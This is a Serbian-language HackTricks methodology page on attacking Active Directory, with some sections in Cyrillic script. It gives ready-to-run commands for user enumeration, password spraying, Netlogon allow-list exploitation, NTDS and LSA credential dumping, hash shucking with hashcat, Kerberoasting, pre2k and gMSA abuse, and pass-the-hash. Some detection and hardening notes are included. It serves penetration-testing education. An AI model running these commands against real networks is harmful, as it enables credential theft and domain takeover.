# Metodologija za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** je temeljna tehnologija koja **mrežnim administratorima** omogućava efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** u mreži. Dizajniran je tako da može da se skalira, pa omogućava organizovanje velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri osnovna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** su grupe domena povezanih zajedničkom strukturom, a **šuma** predstavlja kolekciju više stabala povezanih **odnosima poverenja**, čime se formira najviši sloj organizacione strukture. Konkretna **prava pristupa** i **komunikacije** mogu se dodeliti na svakom od ovih nivoa.

Ključni koncepti u sistemu **Active Directory** obuhvataju:

1. **Direktorijum** – Sadrži sve informacije o objektima sistema Active Directory.
2. **Objekat** – Označava entitete u direktorijumu, uključujući **korisnike**, **grupe** ili **deljene fascikle**.
3. **Domen** – Služi kao kontejner za objekte direktorijuma. U okviru jednog **šuma** može postojati više domena, od kojih svaki održava sopstvenu kolekciju objekata.
4. **Stablo** – Grupa domena koji dele zajednički korenski domen.
5. **Šuma** – Najviši nivo organizacione strukture u sistemu Active Directory; sastoji se od nekoliko stabala povezanih **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz usluga ključnih za centralizovano upravljanje mrežom i komunikaciju u njoj. Te usluge obuhvataju:

1. **Usluge domena** – Centralizuju skladištenje podataka i upravljaju interakcijama između **korisnika** i **domena**, uključujući funkcije **autentifikacije** i **pretrage**.
2. **Usluge sertifikata** – Nadgledaju kreiranje, distribuciju i upravljanje bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržavaju aplikacije koje koriste direktorijum putem **LDAP protokola**.
4. **Directory Federation Services** – Omogućavaju **jedinstvenu prijavu (single sign-on)** radi autentifikacije korisnika u više veb-aplikacija tokom jedne sesije.
5. **Upravljanje pravima** – Pomaže u zaštiti materijala zaštićenog autorskim pravima tako što sprečava njegovu neovlašćenu distribuciju i upotrebu.
6. **DNS usluga** – Ključna za razrešavanje **imena domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - definicija za Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još ne znate kako funkcioniše.**](kerberos-authentication.md)

## Podsetnik

Na [https://wadcoms.github.io/](https://wadcoms.github.io) možete pronaći pregled komandi koje možete da pokrenete za enumeraciju i eksploataciju AD-a.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije tiket za odgovarajući SPN. Pristup računaru putem IP adrese često dovodi do korišćenja NTLM-a umesto Kerberosa.

## Izviđanje Active Directory-ja (bez akreditiva/sesija)

Ako imate pristup AD okruženju, ali nemate akreditive/sesije, možete:

- **Testirati mrežu:**
  - Skenirajte mrežu, pronađite računare i otvorene portove, pa pokušajte da **iskoristite ranjivosti** ili **izvučete akreditive** sa njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
  - Enumeracija DNS-a može otkriti informacije o ključnim serverima u domenu, kao što su veb-serveri, štampači, deljene lokacije, VPN, medijski serveri itd.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Pogledajte opštu [**metodologiju pentesting-a**](../../generic-methodologies-and-resources/pentesting-methodology.md) za više informacija o tome kako to da uradite.
- **Proverite anoniman i Guest pristup SMB uslugama** (ovo neće raditi u modernim verzijama Windowsa):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Detaljnije uputstvo za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerišite LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Detaljnije uputstvo za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anoniman pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Zatrovajte mrežu**
  - Prikupite akreditive [**imitiranjem usluga pomoću Responder-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Pristupite hostu [**zloupotrebom relay attack-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Prikupite akreditive **izlaganjem** [**lažnih UPnP usluga pomoću evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Izvucite korisnička imena i imena iz internih dokumenata, društvenih mreža i usluga (uglavnom veb-usluga) u domenskom okruženju, kao i iz javno dostupnih izvora.
  - Ako pronađete puna imena zaposlenih u kompaniji, možete isprobati različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _ImePrezime_, _Ime.Prezime_, _ImePre_ (po 3 slova od svakog), _Ime.Pre_, _IPrezime_, _I.Prezime_, _PrezimeIme_, _Prezime.Ime_, _PrezimeI_, _Prezime.I_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
  - Alatke:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonimna SMB/LDAP enumeracija:** Pogledajte stranice o [**pentesting-u SMB-a**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting-u LDAP-a**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enumeracija**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti Kerberos kodom greške _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da korisničko ime nije važeće. Za **važeća korisnička imena** server će vratiti ili **TGT u odgovoru AS-REP** ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, koja ukazuje na to da korisnik mora da obavi predautentifikaciju.
- **Bez autentifikacije preko MS-NRPC**: Korišćenje auth-level = 1 (bez autentifikacije) preko MS-NRPC (Netlogon) interfejsa na kontrolerima domena. Ova metoda poziva funkciju `DsrGetDcNameEx2` nakon povezivanja na MS-NRPC interfejs kako bi proverila da li korisnik ili računar postoji, bez ikakvih akreditiva. Alatka [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera na mreži, možete izvršiti i **enumeraciju korisnika** na njemu. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom GitHub repozitorijumu**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz koraka izviđanja koji ste prethodno obavili. Pomoću imena i prezimena možete da upotrebite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje mogućih važećih korisničkih imena.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC-u, nalozi izričito dodati na listu dozvoljenih i dalje mogu biti izloženi **legacy/vulnerable Netlogon secure-channel ponašanju**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća vrednost registra **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL bezbednosni deskriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Svaki nalog ili grupa kojima je dodeljen odgovarajući ACE u DACL-u mogu biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` efektivno dodaje **Everyone** na listu dozvoljenih.

Praktični postupak za operatora:

1. **Identifikujte principale na listi dozvoljenih** proverom i **SYSVOL/GPO** i **aktivnog registra DC-a**.
2. **Razrešite SID-ove** iz SDDL-a u stvarne AD korisnike/računare i dajte prioritet **nalozima računara DC-a**, **nalozima poverenja** i drugim privilegovanim računarima.
3. Više puta pokušajte **MS-NRPC / Netlogon autentifikaciju** kao nalog sa liste dozvoljenih.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da biste resetovali lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Primeri za brzu trijažu / laboratoriju iz javnog artefakta:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Napomene:

- **Scanner** je koristan zato što efektivna **allow-list** može da se nalazi u **SYSVOL-u**, registru ili na oba mesta.
- Sam **exploit path** je važan zato što **ne zahteva privilegije Domain Admin-a** kada se identifikuje ranjiv nalog.
- Kompromitovanje **računarskog naloga Domain Controller-a**, kao što je `DC$`, posebno je opasno jer resetovanje njegove lozinke može direktno da omogući šire puteve za **AD takeover**.
- **Izvodljivost brute-force napada** zavisi od režima: javni artefakt opisuje meet-in-the-middle pristup, **24-bitni** brute force kada je dostupan još jedan računarski nalog i sporije **32-bitne** varijante.

Napomene o detekciji i ojačavanju:

- Revidirajte pravila za allow-list и уклоните све осим привремених, изричито неопходних изузетака за компатибилност.
- Надгледајте DC **System** догађаје **5827/5828/5829/5830/5831** да бисте открили рањиве Netlogon везе које су одбијене, откривене или изричито дозвољене правилима.
- Сматрајте налоге у `VulnerableChannelAllowList` **високоризичним** док се не уклони зависност од застарелог система.

### Познавање једног или више корисничких имена

Дакле, знате да већ имате важеће корисничко име, али немате лозинке... Онда покушајте следеће:

- [**ASREPRoast**](asreproast.md): Ако корисник **нема** атрибут _DONT_REQ_PREAUTH_, можете **затражити AS_REP поруку** за тог корисника, која ће садржати податке шифроване изведеном вредношћу његове лозинке.
- [**Password Spraying**](password-spraying.md): Испробајте најчешће **лозинке** за сваког откривеног корисника; можда неко користи слабу лозинку (имајте у виду политику лозинки!).
  - Имајте на уму да можете да испробате лозинке и на **OWA серверима** како бисте покушали да приступите поштанским серверима корисника.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Можда ћете моћи да **добијете** неке изазовне **hash-еве** тако што ћете извршити **poisoning** неких **мрежних** протокола:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Набрајање Active Directory-ја даје корисничка имена, адресе е-поште и обрасце именовања, потенцијалне хостове и сервисе чија се аутентификација може изнудити. Искористите тај контекст да бисте идентификовали изводљиве [**relay нападе**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) помоћу NTLM-а и потенцијалне путеве у AD окружење.

### Извиђање и провере relay posture-а помоћу NetExec workspaces

- Користите **`nxcdb` workspaces** да бисте чували стање AD извиђања за свако ангажовање: `workspace create <name>` креира SQLite базе података за сваки протокол у `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap итд.). Промените приказ помоћу `proto smb|mssql|winrm` и прикажите прикупљене тајне командом `creds`. Када завршите, ручно уклоните осетљиве податке: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Брзо откривање подмреже командом **`netexec smb <cidr>`** приказује **домен**, **верзију оперативног система**, **захтеве за SMB signing** и **Null Auth**. Чланови домена са ознаком `(signing:False)` подложни су **relay нападима**, док DC-ови често захтевају signing.
- Генеришите **имена хостова у /etc/hosts** директно из NetExec излаза да бисте олакшали циљање:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Kada je **SMB relay ka DC-u blokiran** zbog signing-a, ipak proverite stanje **LDAP-a**: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC na kojem je SMB signing obavezan, ali je LDAP signing onemogućen, i dalje je održiva meta za **relay-to-LDAP** i zloupotrebe poput **SPN-less RBCD**.

### Curenje kredencijala štampača na strani klijenta → masovna validacija domenskih kredencijala

- Web interfejsi štampača ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/alata za razvojne programere može otkriti čitljiv tekst (npr. `<input value="<password>">`), čime se omogućava Basic-auth pristup repozitorijumima za skeniranje/štampanje.
- Preuzeti poslovi štampanja mogu sadržati **dokumente za uvođenje korisnika u sistem u običnom tekstu** sa lozinkama za pojedinačne korisnike. Pri testiranju pazite da parovi ostanu usklađeni:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Krađa NTLM akreditiva

Ako možete da **pristupite drugim računarima ili deljenim resursima** pomoću **null ili guest korisnika**, mogli biste da **postavite datoteke** (kao što je SCF datoteka) kojima će, ako im neko nekako pristupi, **biti pokrenuta NTLM autentifikacija usmerena ka vama**, pa ćete moći da **ukradete** **NTLM challenge** i crack-ujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao moguću lozinku za druge, sporije formate čiji se ključni materijal izvodi direktno iz NT hash-a. Umesto brute-force napada na duge passphrase vrednosti u Kerberos RC4 tiketima, NetNTLM izazovima ili keširanim akreditivima, prosleđujete NT hash-eve Hashcat NT-candidate režimima i omogućavate im da provere ponovnu upotrebu lozinki, a da pritom nikada ne saznate plaintext. Ova tehnika je naročito delotvorna nakon kompromitovanja domena, kada možete da prikupite hiljade aktuelnih i istorijskih NT hash-eva.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate korpus NT hash-eva iz DCSync, SAM/SECURITY dump-ova ili trezora akreditiva i treba da proverite da li se koriste i u drugim domenima/šumama.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM odgovore ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete ponovnu upotrebu dugih, neprovaljivih passphrase vrednosti i odmah da pivot-ujete putem Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv tipova šifrovanja čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen zahteva isključivo AES, morate da se vratite na uobičajene režime za lozinke.

#### Formiranje korpusa NT hash-eva

- **DCSync/NTDS** – Koristite `secretsdump.py` sa istorijom da biste prikupili što veći skup NT hash-eva (i njihovih prethodnih vrednosti):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Unosi u istoriji značajno proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po nalogu. Za još načina za prikupljanje NTDS tajni pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Dump-ovi keša krajnjih tačaka** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i keširane prijave domena (DCC/DCC2). Uklonite duplikate i dodajte te hash-eve na istu listu `nt_candidates.txt`.
- **Pratite metapodatke** – Zabeležite korisničko ime/domen koji su proizveli svaki hash (čak i ako lista reči sadrži samo heksadecimalne vrednosti). Kada Hashcat prikaže pronađenu lozinku, poklapanje hash-eva odmah otkriva koji principal ponovo koristi lozinku.
- Dajte prednost kandidatima iz iste šume ili pouzdane šume; tako se maksimalno povećava verovatnoća poklapanja pri shucking-u.

#### Hashcat režimi NT-kandidata

| Tip hash-a                              | Režim lozinke | Režim NT-kandidata |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- Ulazi za NT-kandidate **moraju ostati sirovi NT hash-evi od 32 heksadecimalna znaka**. Isključite rule engine-e (bez `-r` i hibridnih režima) jer izmena kvari materijal ključa kandidata.
- Ovi režimi nisu sami po sebi brži, ali je prostor ključeva NTLM-a (~30.000 MH/s na M3 Max) oko 100 puta brži od Kerberos RC4 (~300 MH/s). Testiranje pažljivo odabrane NT liste mnogo je jeftinije nego pretraživanje celog prostora lozinki u sporijem formatu.
- Uvek koristite **najnoviju verziju Hashcat-a** (`git clone https://github.com/hashcat/hashcat && make install`) jer su režimi 31500/31600/35300/35400 objavljeni nedavno.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT režim za AS-REQ Pre-Auth, a AES etype-i (19600/19700) zahtevaju lozinku u čistom tekstu jer se njihovi ključevi izvode pomoću PBKDF2 iz lozinki kodiranih u UTF-16LE, a ne iz sirovih NT hash-eva.

#### Primer – Kerberoast RC4 (režim 35300)

1. Uhvatite RC4 TGS za ciljni SPN pomoću korisnika sa niskim privilegijama (detalje potražite na stranici Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck-ujte ticket pomoću svoje NT liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Poklapanje potvrđuje da servisni nalog koristi jedan od vaših postojećih NT hash-eva.

3. Odmah pređite na PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Po potrebi, kasnije možete da povratite plaintext pomoću komande `hashcat -m 1000 <matched_hash> wordlists/`.

#### Primer – Keširani akreditivi (mode 31600)

1. Dumpujte keširane prijave sa kompromitovane radne stanice:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopirajte DCC2 liniju za zanimljivog korisnika domena u `dcc2_highpriv.txt` i izvršite shucking nad njom:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Uspešno poklapanje daje NT hash koji je već poznat na vašoj listi, čime se dokazuje da keširani korisnik ponovo koristi istu lozinku. Iskoristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM režimu da biste otkrili lozinku.

Isti postupak važi za NetNTLM challenge-response vrednosti (`-m 27000/27100`) i DCC (`-m 31500`). Kada pronađete poklapanje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crack-ovati NT hash pomoću maski/pravila offline.



## Enumeracija Active Directory-ja SA kredencijalima/sesijom

Za ovu fazu morate da **kompromitujete kredencijale ili sesiju važećeg domenskog naloga.** Ako imate neke važeće kredencijale ili shell kao domenski korisnik, **imajte na umu da su prethodno navedene opcije i dalje dostupne za kompromitovanje drugih korisnika**.

Pre početka autentifikovane enumeracije, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracija

Kompromitovanje naloga je **veliki korak u proceni domena**, jer omogućava autentifikovanu **enumeraciju Active Directory-ja**:

Što se tiče [**ASREPRoast**](asreproast.md), sada možete pronaći sve potencijalno ranjive korisnike, a što se tiče [**Password Spraying**](password-spraying.md), možete dobiti **listu svih korisničkih imena** i isprobati lozinku kompromitovanog naloga, prazne lozinke i nove obećavajuće lozinke.

- Možete koristiti [**CMD za osnovni recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete koristiti i [**powershell za recon**](../basic-powershell-for-pentesters/index.html), koji će biti manje upadljiv
- Možete koristiti i [**powerview**](../basic-powershell-for-pentesters/powerview.md) za izdvajanje detaljnijih informacija
- Još jedan odličan alat za recon u Active Directory-ju je [**BloodHound**](bloodhound.md). **Nije naročito neupadljiv** (u zavisnosti od metoda prikupljanja koje koristite), ali **ako vam to ne smeta**, svakako ga isprobajte. Pronađite gde korisnici mogu da koriste RDP, putanju do drugih grupa itd.
  - **Ostali automatizovani alati za enumeraciju AD-ja su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Pregledajte [**DNS zapise AD-ja**](ad-dns-records.md), jer mogu sadržati zanimljive informacije.
- **Alat sa GUI-jem** koji možete koristiti za enumeraciju direktorijuma je **AdExplorer.exe** iz paketa **SysInternal** Suite.
- LDAP bazu podataka možete pretražiti i pomoću **ldapsearch** da biste potražili kredencijale u poljima _userPassword_ i _unixUserPassword_, ili čak u beleškama _description_ i _info_ korisnika. Token u polju _info_ koji liči na lozinku, ali nije označen, samo je kandidat: zasebno potvrdite njegovu namenu i važenje, a sadržaj beleški izostavite iz uobičajenog izlaza enumeracije. Za druge metode pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Pregledajte dostupne skripte za prijavljivanje na domen i mapiranje diskova u `\\<dc>\NETLOGON` ili `\\<dc>\SYSVOL\<domain>\scripts`, ako imate ovlašćenje. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) ulogu deljenog direktorijuma skripti u NETLOGON deljenom resursu. Najpre izlistajte nazive, a zatim pregledajte samo relevantne i čitljive skripte, uz ograničenje veličine; nemojte izlistavati ceo deljeni resurs niti ispisivati vrednosti kredencijala tokom uobičajene enumeracije. PowerShell poziv [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne štiti** doslovno navedenu lozinku sačuvanu u skripti. Sam poziv ne dokazuje da je tajna hardkodirana: utvrdite šta mu se prosleđuje, a zatim zasebno proverite nalog, važenje kredencijala i privilegije. Pregled domenske skripte na udaljenom deljenom resursu odvojen je od enumeracije lokalnog hosta.
- Ako koristite **Linux**, domen možete enumerisati i pomoću alata [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete isprobati i automatizovane alate kao što su:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Izdvajanje svih domenskih korisnika**

  Veoma je lako doći do svih domenskih korisničkih imena iz Windows-a (`net user /domain` ,`Get-DomainUser` ili `wmic useraccount get name,sid`). U Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Iako ovaj odeljak o enumeraciji deluje kratak, on je najvažniji deo svega. Otvorite linkove (naročito one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne uhodate. Tokom procene, ovo će biti ključni trenutak za pronalaženje puta do DA ili za odluku da se ništa ne može uraditi.

### Unapred kreirani predvidljivi računari → pristup gMSA lozinkama

Računi računara pripremljeni za nasleđene pridruživanja mogu zadržati predvidljivu početnu lozinku. NetExec-ov modul `pre2k` prepoznaje karakterističnu vrednost `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) i pokušava da dobije Kerberos TGT koristeći prvih 14 znakova imena računara napisanih malim slovima, bez završnog znaka `$`. Tretirajte ovu UAC vrednost kao kriterijum za odabir kandidata, a ne kao dokaz da je lozinka slaba samo zato što je nalog član grupe **Pre-Windows 2000 Compatible Access**.<sup>[[18]](#references)[[20]](#references)</sup>

Koristite autentifikovanu LDAP enumeraciju da biste testirali kandidate i sačuvali uspešno dobijene TGT-ove. `ALL=True` proširuje testiranje i na objekte koji ne odgovaraju podrazumevanom filteru `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Neuspešan podrazumevani/NTLM bind **ne** poništava ovaj nalaz: testirajte sa `-k`, FQDN-om koji se razrešava na DC i satom sinhronizovanim sa KDC-om. Uspešna pokretanja modula upisuju liste kandidata i pribavljene ccaches datoteke u `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nakon kompromitovanja computer principal-a, mapirajte njegova članstva u ugnježdenim grupama i izlazna prava. Konkretno, principal-i navedeni u bezbednosnom deskriptoru `msDS-GroupMSAMembership` za gMSA mogu da čitaju `msDS-ManagedPassword`; NetExec-ov izlaz `--gmsa` prikazuje principal-e kojima je to dozvoljeno i vraća aktuelni NT hash ako je autentifikacioni computer ovlašćen.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Zatim proceni oporavljeni gMSA kao bilo koji drugi credential: proveri članstvo u lokalnim/domenskim grupama, prava za prijavu, SPN-ove, delegaciju i dostupne servise pre nego što pokušaš pass-the-hash. Ovaj način preuzimanja zasnovan na ACL-ovima razlikuje se od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), koji izvodi upravljane lozinke nakon kompromitovanja KDS root key-ja.<sup>[[20]](#references)</sup>

Computer principal može imati i izlaznu kontrolu nad drugim computer objektima ili grupama. Nakon što preuzmeš jedan, zasebno proveri njegova ugnježdena članstva i efektivne ACL-ove: pravo pisanja na drugi computer objekat može omogućiti promenu naloga, a prava članstva u grupi mogu dovesti do uloge koja omogućava prijavu. Oznaka staged-account, predvidljiva konvencija imenovanja ili sama `GenericWrite` veza ne dokazuju da je ceo put moguć.

Čitljiva kopija `msDS-ManagedPassword` bloba u datoteci, deljenom resursu ili rezervnoj kopiji predstavlja zaseban put izlaganja: LDAP read ACL ne može da zaštiti kopiju sačuvanu na drugom mestu. Pre tumačenja proveri da li su podaci zaista blob upravljane lozinke i razlikuj to od autorizovanog LDAP čitanja i izvođenja iz KDS root key-ja.

### Kerberoast

Kerberoasting podrazumeva preuzimanje **TGS karata** koje koriste servisi povezani sa korisničkim nalozima i razbijanje njihove enkripcije — zasnovane na korisničkim lozinkama — **van mreže**.

Više informacija o tome:


{{#ref}}
kerberoast.md
{{#endref}}

### Udaljeno povezivanje (RDP, SSH, FTP, Win-RM itd.)

